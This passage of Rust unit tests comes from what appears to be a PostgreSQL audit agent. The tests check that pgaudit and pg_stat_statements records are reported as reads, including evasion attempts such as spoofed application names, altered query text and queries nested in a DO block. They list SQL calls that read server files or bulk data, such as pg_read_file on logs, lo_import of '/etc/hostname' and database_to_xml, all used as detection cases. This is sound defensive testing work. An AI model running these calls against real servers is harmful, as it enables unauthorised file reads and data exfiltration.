        let mut r = rec(
            "r9",
            1,
            sub,
            "READ",
            "SELECT",
            object,
            text,
            Some(1),
            "psql",
        );
        r.audit.object_type = object_type.to_owned();
        r
    }

    /// ADR-0049 decision 3 with `pgaudit.log_relation` (records as seen on
    /// PostgreSQL 16 with pgaudit 16.0: a read of `pg_stat_activity` gets
    /// records of the view, `pg_database` and `pg_authid`; a user view
    /// over it adds the view's record in the same substatement).
    #[test]
    fn relation_records_of_listed_entries() {
        let activity_records = |sub: u64, text: &str| {
            vec![
                obj_rec(sub, "pg_catalog.pg_stat_activity", "VIEW", text),
                obj_rec(sub, "pg_catalog.pg_database", "TABLE", text),
                obj_rec(sub, "pg_catalog.pg_authid", "TABLE", text),
            ]
        };
        let convert = |recs: Vec<AuditRecord>, log_catalog| {
            let mut b = PgauditEvents::new(own());
            b.set_catalogs(shop_catalogs(log_catalog));
            b.convert(recs, SystemTime::now())
        };
        // The text names the view in the no-text shape: quiet.
        assert!(convert(activity_records(1, QUIET[0]), Some(true)).is_empty());
        // The text names it with its text: a text read.
        let ev = convert(activity_records(1, DODGES[0]), Some(true));
        assert_eq!(objects_of(&ev[0]), [ACTIVITY]);
        // A user view over it: the view's record and the core-list record
        // in the same substatement; the text names only the view.
        let text = "SELECT pid FROM public.v";
        let mut recs = vec![obj_rec(1, "public.v", "VIEW", text)];
        recs.extend(activity_records(1, text));
        let ev = convert(recs, Some(true));
        assert_eq!(objects_of(&ev[0]), [ACTIVITY, "shop.public.v"]);
        assert!(ev[0].always_report());
        // A view outside `pg_catalog` next to a core-list record the text
        // names in the no-text shape (security re-review N2): a text read.
        let text = "SELECT a.pid FROM pg_stat_activity a, public.v";
        let mut recs = vec![obj_rec(1, "public.v", "VIEW", text)];
        recs.extend(activity_records(1, text));
        let ev = convert(recs, Some(true));
        assert!(objects_of(&ev[0]).contains(&ACTIVITY.to_owned()));
        // An SQL function's body logged as its own substatement.
        let mut recs = vec![rec(
            "r9",
            1,
            1,
            "FUNCTION",
            "EXECUTE",
            "",
            "SELECT * FROM public.f()",
            None,
            "psql",
        )];
        recs.extend(activity_records(
            2,
            "SELECT query FROM pg_catalog.pg_stat_activity",
        ));
        recs.push(rec(
            "r9",
            1,
            3,
            "READ",
            "SELECT",
            "",
            "SELECT * FROM public.f()",
            Some(1),
            "psql",
        ));
        let ev = convert(recs, Some(true));
        assert!(
            objects_of(&ev[0]).contains(&ACTIVITY.to_owned()),
            "{:?}",
            objects_of(&ev[0])
        );
        // The extension's view: function record (ignored) then the view's.
        let text = "SELECT queryid FROM public.pg_stat_statements";
        let recs = vec![
            rec("r9", 1, 1, "FUNCTION", "EXECUTE", "", text, None, "psql"),
            obj_rec(2, "public.pg_stat_statements", "VIEW", text),
        ];
        assert!(convert(recs, Some(true)).is_empty());
        // An extension-list record the text does not name.
        let text = "SELECT * FROM public.v2";
        let recs = vec![
            obj_rec(1, "public.v2", "VIEW", text),
            obj_rec(1, "pmm.pg_stat_monitor", "VIEW", text),
        ];
        let ev = convert(recs, Some(true));
        assert_eq!(
            objects_of(&ev[0]),
            ["shop.pmm.pg_stat_monitor", "shop.public.v2"]
        );
        assert!(ev[0].always_report());
        // `log_catalog = off` (verified): the user view's record only; it is
        // named by what the statement shows (residual).
        let text = "SELECT pid FROM public.v";
        let ev = convert(vec![obj_rec(1, "public.v", "VIEW", text)], Some(false));
        assert_eq!(objects_of(&ev[0]), ["shop.public.v"]);
        assert!(!ev[0].always_report());
    }

    /// ADR-0049 decision 5: `pss_counters` is quiet in both `toplevel`
    /// forms on both sources; `pss_texts` is the agent's own only by exact
    /// text (and, on pgaudit, within a `pg_stat_statements` period).
    #[test]
    fn the_agents_own_statement_text_query() {
        for toplevel in [true, false] {
            let counters = sql::pss_counters("public", toplevel).unwrap();
            assert_quiet(&counters);
            // As `pg_stat_statements` stores it.
            assert_quiet(&pss_form(&counters).unwrap());
        }
        let texts_sql = sql::pss_texts("public", true).unwrap();
        let stored = pss_form(&texts_sql).unwrap();
        // pg_stat_statements: the poller's admitted own entry (`own_text`)
        // is left out uncharged; the same text otherwise is reported.
        let usage = SharedOwnUsage::default();
        let mut own = own_with(ClientAddr::parse("192.0.2.14"), 1000, usage.clone());
        own.allow_text_query(&texts_sql);
        assert!(pss_text_events(&stored, "databastion", false, &mut own, true).is_empty());
        for (user, own_text) in [("databastion", false), ("app", false)] {
            let ev = pss_text_events(&stored, user, false, &mut own, own_text);
            assert_eq!(objects_of(&ev[0]), [PSS], "{user}");
            assert!(ev[0].always_report());
        }
        // One byte changed: not the own text, reported.
        let changed = stored.replace("LIMIT", "limit");
        assert!(!own.own_pss_text(&changed));
        let ev = pss_text_events(&changed, "databastion", false, &mut own, false);
        assert_eq!(objects_of(&ev[0]), [PSS]);
        assert!(charged_keys(&usage).is_empty());
        // pgaudit: within a `pg_stat_statements` period, from the agent's
        // application and address, exactly: left out.
        let periods = SharedPssPeriods::default();
        let registry = SharedOwnStatements::default();
        let fresh = |periods: &SharedPssPeriods| {
            let mut o = own_shared(
                ClientAddr::parse("192.0.2.14"),
                1000,
                SharedOwnUsage::default(),
                std::sync::Arc::clone(&registry),
            )
            .with_periods(std::sync::Arc::clone(periods));
            o.allow_text_query(&texts_sql);
            o
        };
        let agent = crate::conn::APPLICATION_NAME;
        // No period yet (an agent restart): reported.
        let ev = pgaudit_text_events(
            &texts_sql,
            "READ",
            "SELECT",
            agent,
            Some(true),
            fresh(&periods),
        );
        assert_eq!(objects_of(&ev[0]), [PSS]);
        assert!(ev[0].always_report());
        // The record time (2026-09-28 21:45:31 UTC) within a period.
        let record = SystemTime::UNIX_EPOCH + std::time::Duration::from_secs(1_790_631_931);
        periods
            .lock()
            .unwrap()
            .start(record - std::time::Duration::from_secs(60));
        assert!(
            pgaudit_text_events(
                &texts_sql,
                "READ",
                "SELECT",
                agent,
                Some(true),
                fresh(&periods)
            )
            .is_empty()
        );
        // A closed period ends at its stop plus the statement timeout, less
        // the skew tolerance (security review L2), never before its start.
        let mut p = PssPeriods::default();
        let t0 = record - std::time::Duration::from_secs(100);
        p.start(t0);
        p.stop(
            t0 + std::time::Duration::from_secs(50),
            std::time::Duration::from_secs(30),
        );
        let end = t0 + std::time::Duration::from_secs(80) - PSS_PERIOD_SKEW;
        assert!(p.covers(t0) && p.covers(end));
        assert!(!p.covers(end + std::time::Duration::from_millis(1)));
        assert!(!p.covers(t0 - std::time::Duration::from_millis(1)));
        let mut p = PssPeriods::default();
        p.start(t0);
        p.stop(t0, std::time::Duration::from_secs(1));
        assert!(p.covers(t0) && !p.covers(t0 + std::time::Duration::from_millis(1)));
        // Ended before the record (plus the statement timeout): reported.
        let ended = SharedPssPeriods::default();
        ended
            .lock()
            .unwrap()
            .start(record - std::time::Duration::from_secs(600));
        ended.lock().unwrap().stop(
            record - std::time::Duration::from_secs(60),
            std::time::Duration::from_secs(30),
        );
        let ev = pgaudit_text_events(
            &texts_sql,
            "READ",
            "SELECT",
            agent,
            Some(true),
            fresh(&ended),
        );
        assert_eq!(objects_of(&ev[0]), [PSS]);
        // Within the statement timeout after the end: left out.
        let late = SharedPssPeriods::default();
        late.lock()
            .unwrap()
            .start(record - std::time::Duration::from_secs(600));
        late.lock().unwrap().stop(
            record - std::time::Duration::from_secs(10),
            std::time::Duration::from_secs(30),
        );
        assert!(
            pgaudit_text_events(
                &texts_sql,
                "READ",
                "SELECT",
                agent,
                Some(true),
                fresh(&late)
            )
            .is_empty()
        );
        // Within a period: another application, another role, one byte
        // changed, a relation record of another listed entry, nested in a
        // DO block: reported.
        let ev = pgaudit_text_events(
            &texts_sql,
            "READ",
            "SELECT",
            "stolen",
            Some(true),
            fresh(&periods),
        );
        assert_eq!(objects_of(&ev[0]), [PSS]);
        let ev = pgaudit_text_events(
            &texts_sql,
            "READ",
            "SELECT",
            "psql",
            Some(true),
            fresh(&periods),
        );
        assert_eq!(objects_of(&ev[0]), [PSS]);
        let ev = pgaudit_text_events(
            &texts_sql.replace("LIMIT", "limit"),
            "READ",
            "SELECT",
            agent,
            Some(true),
            fresh(&periods),
        );
        assert_eq!(objects_of(&ev[0]), [PSS]);
        let mut b = PgauditEvents::new(fresh(&periods));
        b.set_catalogs(shop_catalogs(Some(true)));
        let mut r = rec(
            "o1",
            1,
            1,
            "READ",
            "SELECT",
            "pg_catalog.pg_stat_activity",
            &texts_sql,
            Some(1),
            agent,
        );
        r.audit.object_type = "VIEW".to_owned();
        let ev = b.convert(vec![r], SystemTime::now());
        assert_eq!(objects_of(&ev[0]), [ACTIVITY, PSS]);
        let nested = format!("DO $$ BEGIN PERFORM 1 FROM ({texts_sql}) x; END $$");
        let ev = pgaudit_text_events(
            &nested,
            "READ",
            "SELECT",
            agent,
            Some(true),
            fresh(&periods),
        );
        assert_eq!(objects_of(&ev[0]), [PSS]);
        // Any other text read from the agent's account: reported.
        for text in [DODGES[0], "SELECT query FROM public.pg_stat_statements"] {
            let ev =
                pgaudit_text_events(text, "READ", "SELECT", agent, Some(true), fresh(&periods));
            assert_eq!(ev.len(), 1, "{text}");
        }
    }

    /// ADR-0049 decision 7: each function next to a catalog, and
    /// table-less, is a read of `*`, always reported, never the agent's
    /// own; the same name in another schema is a user function (decision
    /// 8, a separate change).
    #[test]
    fn functions_that_read_past_the_relations() {
        let calls = [
            "query_to_xml('select query from pg_stat_activity', true, false, '')",
            "query_to_xmlschema('select 1', true, false, '')",
            "query_to_xml_and_xmlschema('select 1', true, false, '')",
            "cursor_to_xml('c', 1, true, false, '')",
            "cursor_to_xmlschema('c', true, false, '')",
            "table_to_xml('crm.customer', true, false, '')",
            "table_to_xmlschema('crm.customer', true, false, '')",
            "table_to_xml_and_xmlschema('crm.customer', true, false, '')",
            "schema_to_xml('crm', true, false, '')",
            "schema_to_xmlschema('crm', true, false, '')",
            "schema_to_xml_and_xmlschema('crm', true, false, '')",
            "database_to_xml(true, false, '')",
            "database_to_xmlschema(true, false, '')",
            "database_to_xml_and_xmlschema(true, false, '')",
            "ts_stat('select v from crm.docs')",
            "ts_rewrite('a'::tsquery, 'select t, s from crm.aliases')",
            "pg_read_file('log/postgresql.log')",
            "pg_read_file('log/postgresql.log', 0, 100)",
            "pg_read_binary_file('log/postgresql.log')",
            "pg_read_file_old('log/postgresql.log', 0, 100)",
            "pg_logical_slot_get_changes('s', NULL, NULL)",
            "pg_logical_slot_peek_changes('s', NULL, NULL)",
            "pg_logical_slot_get_binary_changes('s', NULL, NULL)",
            "pg_logical_slot_peek_binary_changes('s', NULL, NULL)",
            "lo_get(16400)",
            "loread(0, 10)",
            "lo_export(16400, '/tmp/x')",
            "lo_import('/etc/hostname')",
            "lo_import('/etc/hostname', 16500)",
        ];
        for call in calls {
            for text in [
                format!("SELECT {call} FROM pg_class LIMIT 1"),
                format!("SELECT pg_catalog.{call} FROM pg_catalog.pg_class LIMIT 1"),
                format!("SELECT {call}"),
            ] {
                assert_text_read(&text, "READ", "SELECT", &["shop..*"], true);
            }
        }
        let text =
            "SELECT data FROM pg_logical_slot_peek_changes('s', NULL, NULL), pg_class LIMIT 1";
        assert_text_read(text, "READ", "SELECT", &["shop..*"], true);
        // Not this list: `crm.query_to_xml` is a user function next to
        // catalogs (decision 8: `*` too), `pg_ls_dir` and `pg_stat_file`
        // metadata.
        assert_text_read(
            "SELECT crm.query_to_xml('x') FROM pg_catalog.pg_class LIMIT 1",
            "READ",
            "SELECT",
            &["shop..*"],
            true,
        );
        for text in [
            "SELECT pg_ls_dir('log') FROM pg_class LIMIT 1",
            "SELECT pg_stat_file('PG_VERSION') FROM pg_class LIMIT 1",
        ] {
            assert_quiet(text);
        }
    }
}
